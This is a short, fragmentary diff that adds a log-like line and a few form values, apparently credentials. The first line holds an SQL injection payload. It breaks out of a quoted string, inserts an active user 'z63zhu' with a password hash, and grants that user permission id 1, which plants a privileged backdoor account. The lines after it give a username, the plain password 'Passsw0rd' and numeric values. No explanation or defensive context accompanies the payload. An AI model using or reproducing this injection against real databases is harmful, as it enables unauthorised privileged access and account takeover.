@@ -1,0 +1,6 @@
+[07:00:57PM] Resetting /z63zhu/...<br>success!cafebabe'; INSERT INTO users(username,password,confirm,active) VALUES ('z63zhu','aea9a50b7a31b77faf2efb149016d4d38b260979','',1); INSERT INTO ref (id_perm,id_user) VALUES (1,10)-- 
+z63zhu
+Passsw0rd
+1
+444444
+444444444
